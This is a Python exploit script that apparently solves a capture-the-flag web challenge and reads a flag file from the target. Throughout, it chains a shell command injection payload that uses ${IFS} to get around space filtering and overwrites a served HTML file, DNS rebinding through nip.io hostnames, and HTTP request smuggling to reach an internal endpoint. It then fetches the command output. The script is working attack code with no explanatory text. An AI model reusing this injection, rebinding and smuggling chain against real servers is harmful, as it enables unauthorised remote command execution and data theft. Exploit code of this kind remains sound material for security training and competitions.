import socket, json

CHALLENGE_IP, CHALLENGE_PORT = "83.136.251.211", 44930
CHALLENGE_URL = f"http://{CHALLENGE_IP}:{CHALLENGE_PORT}"

def cmd_injection(cmd):
    return f";{cmd}>/app/proxy/includes/index.html".replace(" ", "${IFS}")


def ip_to_hex(ip_address):
    octets = ip_address.split(".")
    hex_octets = [format(int(octet), "02X") for octet in octets]
    hex_ip = "".join(hex_octets)
    return hex_ip


def rebind_host(ip):
    hex_ip = ip_to_hex(ip).lower()
    return f"magic-{hex_ip}.nip.io"


def get_ip():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((CHALLENGE_IP, CHALLENGE_PORT))

    req = f"GET /server-status HTTP/1.1"
    sock.sendall(req.encode())
    status = sock.recv(4096).decode()
    ip = status.split("IPs: ")[1].strip()
    sock.close()
    return ip


def run_command(cmd, ip):
    command_injection = cmd_injection(cmd)
    host = rebind_host(ip)

    json_payload = json.dumps({
        "interface": command_injection
    })
    payload_length = str(len(json_payload))

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((CHALLENGE_IP, CHALLENGE_PORT))

    req = f"POST /a HTTP/1.1\r\nHost: {host}:5000\r\nContent-Length: 1\r\n\r\na\r\n\r\nPOST /flushInterface\r\nContent-Length: {payload_length}\r\nContent-Type: application/json\r\n\r\n{json_payload}"
    sock.sendall(req.encode())
    sock.recv(4096)
    sock.close()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((CHALLENGE_IP, CHALLENGE_PORT))

    req = f"GET / HTTP/1.1\r\nHost: {host}:1337\r\n\r\n"
    sock.sendall(req.encode())
    output = sock.recv(4096)
    sock.close()

    return output


def pwn():
    ip = get_ip()
    flag = run_command("cat /flag.txt", ip)
    print(flag)


def main():
    pwn()


if __name__ == "__main__":
        main()